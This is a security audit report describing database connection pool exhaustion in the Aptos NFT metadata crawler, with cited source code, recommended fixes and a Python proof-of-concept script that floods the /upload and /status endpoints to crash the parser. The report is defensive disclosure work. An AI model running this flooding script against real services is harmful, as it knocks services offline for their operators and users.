# Audit Report

## Title
Database Connection Pool Exhaustion Causing NFT Metadata Crawler Denial of Service

## Summary
An attacker can exhaust the NFT metadata crawler's database connection pool by flooding publicly accessible API endpoints with concurrent requests, preventing the parser from obtaining connections and causing it to panic and terminate the service.

## Finding Description

The NFT metadata crawler shares a single database connection pool across all its components with default r2d2 settings (10 connections maximum, 30-second timeout). [1](#0-0) 

The connection pool is created with no explicit size, timeout, or other configuration parameters, resulting in the use of r2d2's defaults.

Two publicly accessible API endpoints use this pool without rate limiting or authentication:
- POST `/upload` 
- GET `/status/:application_id/:idempotency_key` [2](#0-1) 

Both endpoints acquire connections from the pool: [3](#0-2) [4](#0-3) 

The parser component, which processes NFT metadata from PubSub messages, also requires a database connection. Critically, when the parser fails to obtain a connection, it panics instead of handling the error gracefully: [5](#0-4) 

**Attack Scenario:**
1. Attacker sends >10 concurrent HTTP requests to `/upload` or `/status` endpoints
2. Each request acquires a connection from the 10-connection pool
3. All connections become exhausted
4. Parser receives PubSub message and attempts to get a connection
5. Connection request times out after 30 seconds
6. Parser panics, causing process termination
7. NFT metadata indexing stops completely until manual service restart

While `LedgerInfo::get()` itself only receives an already-acquired connection as a parameter and doesn't directly exhaust the pool, it is called within the connection acquisition flow: [6](#0-5) [7](#0-6) 

## Impact Explanation

This vulnerability is correctly rated as **Low Severity** per the Aptos bug bounty program criteria for the following reasons:

1. **Scope**: Only affects the NFT metadata crawler ecosystem tool, not core blockchain operations (consensus, execution, state management, governance, or staking)
2. **Impact**: Service-level denial of service that prevents new NFT metadata from being indexed
3. **Recovery**: Service can be restarted manually; no permanent data loss or blockchain impact
4. **Non-critical**: NFT metadata indexing is ancillary to core blockchain functionality

The vulnerability does NOT affect:
- Blockchain consensus or safety
- Transaction processing or validation
- Validator operations
- On-chain asset security
- Core node operations

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is straightforward to execute:
- No authentication required on API endpoints
- No rate limiting implemented
- Only requires ability to make HTTP requests to the service
- Small connection pool (10 connections) is easily exhausted
- Attack can be sustained with minimal resources [8](#0-7) 

The service exposes HTTP endpoints on a configured port with no visible protection mechanisms.

## Recommendation

Implement multiple layers of defense:

1. **Add Rate Limiting**: Implement request rate limiting on API endpoints using middleware or reverse proxy
2. **Increase Pool Size**: Configure a larger connection pool appropriate for expected load
3. **Graceful Error Handling**: Replace panic with proper error handling in the parser
4. **Separate Pools**: Use dedicated connection pools for API and parser components
5. **Add Authentication**: Require API keys or other authentication for upload/status endpoints

Example fix for graceful error handling:

```rust
let mut conn = match self.pool.get() {
    Ok(conn) => {
        GOT_CONNECTION_COUNT.inc();
        conn
    },
    Err(e) => {
        error!(
            pubsub_message = pubsub_message,
            error = ?e,
            "[NFT Metadata Crawler] Failed to get DB connection, skipping message"
        );
        UNABLE_TO_GET_CONNECTION_COUNT.inc();
        return; // Skip this message instead of panicking
    }
};
```

Example fix for pool configuration:

```rust
pub fn establish_connection_pool(database_url: &str) -> Pool<ConnectionManager<PgConnection>> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    Pool::builder()
        .max_size(50) // Increase pool size
        .connection_timeout(Duration::from_secs(60))
        .build(manager)
        .expect("Failed to create pool.")
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
import requests
import threading
import time

# Configuration
API_BASE_URL = "http://localhost:8080"  # Adjust to actual service URL
NUM_THREADS = 15  # Exceed pool size of 10

def flood_upload_endpoint():
    """Repeatedly call upload endpoint to hold connections"""
    while True:
        try:
            response = requests.post(
                f"{API_BASE_URL}/upload",
                json={
                    "idempotency_key": "test_key",
                    "application_id": "test_app",
                    "urls": ["https://example.com/nft.json"]
                },
                timeout=60  # Hold connection for longer
            )
            print(f"Response: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

def flood_status_endpoint():
    """Repeatedly call status endpoint to hold connections"""
    while True:
        try:
            response = requests.get(
                f"{API_BASE_URL}/status/test_app/test_key",
                timeout=60
            )
            print(f"Status response: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

if __name__ == "__main__":
    print(f"Starting connection pool exhaustion attack with {NUM_THREADS} threads...")
    print("This will exhaust the 10-connection pool and prevent parser from indexing NFT metadata")
    
    threads = []
    for i in range(NUM_THREADS // 2):
        t1 = threading.Thread(target=flood_upload_endpoint)
        t2 = threading.Thread(target=flood_status_endpoint)
        t1.start()
        t2.start()
        threads.extend([t1, t2])
    
    # Wait for threads
    for t in threads:
        t.join()
```

**Expected Result**: After running this script, when the parser receives a PubSub message and attempts to get a database connection, it will timeout and panic, terminating the NFT metadata crawler process.

## Notes

This vulnerability exists in the NFT metadata crawler ecosystem tool, which is separate from the core Aptos blockchain infrastructure. While it represents a genuine denial-of-service vulnerability with a clear exploitation path, it does not impact consensus safety, transaction processing, validator operations, or any critical blockchain invariants. The Low severity rating is appropriate given the limited scope of impact and the availability of straightforward mitigation strategies.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/utils/database.rs (L20-25)
```rust
pub fn establish_connection_pool(database_url: &str) -> Pool<ConnectionManager<PgConnection>> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    Pool::builder()
        .build(manager)
        .expect("Failed to create pool.")
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/database.rs (L67-92)
```rust
pub fn check_or_update_chain_id(
    conn: &mut PooledConnection<ConnectionManager<PgConnection>>,
    pubsub_chain_id: i64,
) -> anyhow::Result<u64> {
    info!("[NFT Metadata Crawler] Checking if chain id is correct");

    let maybe_existing_chain_id = LedgerInfo::get(conn)?.map(|li| li.chain_id);

    match maybe_existing_chain_id {
        Some(chain_id) => {
            anyhow::ensure!(chain_id == pubsub_chain_id, "[NFT Metadata Crawler] Wrong chain detected! Trying to index chain {} now but existing data is for chain {}", pubsub_chain_id, chain_id);
            info!(
                chain_id = chain_id,
                "[NFT Metadata Crawler] Chain id matches! Continue to index...",
            );
            Ok(chain_id as u64)
        },
        None => {
            info!(
                chain_id = pubsub_chain_id,
                "[NFT Metadata Crawler] Adding chain id to db, continue to index.."
            );
            insert_chain_id(conn, pubsub_chain_id).map(|_| pubsub_chain_id as u64)
        },
    }
}
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/mod.rs (L139-148)
```rust
    fn build_router(&self) -> axum::Router {
        let self_arc = Arc::new(self.clone());
        axum::Router::new()
            .route("/upload", post(Self::handle_upload_batch))
            .route(
                "/status/:application_id/:idempotency_key",
                get(Self::handle_get_status),
            )
            .layer(Extension(self_arc.clone()))
    }
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/get_status.rs (L17-23)
```rust
pub fn get_status(
    pool: Pool<ConnectionManager<PgConnection>>,
    idempotency_tuple: &IdempotencyTuple,
) -> anyhow::Result<AHashMap<String, GetStatusResponseSuccess>> {
    let mut conn = pool.get()?;
    let mut status_response = AHashMap::new();
    let rows = query_status(&mut conn, idempotency_tuple)?;
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/upload_batch.rs (L19-24)
```rust
pub fn upload_batch(
    pool: Pool<ConnectionManager<PgConnection>>,
    request: &BatchUploadRequest,
) -> anyhow::Result<IdempotencyTuple> {
    let mut conn = pool.get()?;
    let existing_rows = get_existing_rows(&mut conn, &request.urls)?;
```

**File:** ecosystem/nft-metadata-crawler/src/parser/mod.rs (L110-118)
```rust
        let mut conn = self.pool.get().unwrap_or_else(|e| {
            error!(
                pubsub_message = pubsub_message,
                error = ?e,
                "[NFT Metadata Crawler] Failed to get DB connection from pool");
            UNABLE_TO_GET_CONNECTION_COUNT.inc();
            panic!();
        });
        GOT_CONNECTION_COUNT.inc();
```

**File:** ecosystem/nft-metadata-crawler/src/models/ledger_info.rs (L18-25)
```rust
    pub fn get(
        conn: &mut PooledConnection<ConnectionManager<PgConnection>>,
    ) -> diesel::QueryResult<Option<Self>> {
        ledger_infos::table
            .select(ledger_infos::all_columns)
            .first::<Self>(conn)
            .optional()
    }
```

**File:** ecosystem/nft-metadata-crawler/src/config.rs (L84-104)
```rust
#[async_trait::async_trait]
impl RunnableConfig for NFTMetadataCrawlerConfig {
    /// Main driver function that establishes a connection to Pubsub and parses the Pubsub entries in parallel
    async fn run(&self) -> anyhow::Result<()> {
        info!("[NFT Metadata Crawler] Starting with config: {:?}", self);

        info!("[NFT Metadata Crawler] Connecting to database");
        let pool = establish_connection_pool(&self.database_url);
        info!("[NFT Metadata Crawler] Database connection successful");

        info!("[NFT Metadata Crawler] Running migrations");
        run_migrations(&pool);
        info!("[NFT Metadata Crawler] Finished migrations");

        // Create request context
        let context = self.server_config.build_context(pool).await;
        let listener = TcpListener::bind(format!("0.0.0.0:{}", self.server_port)).await?;
        axum::serve(listener, context.build_router()).await?;

        Ok(())
    }
```
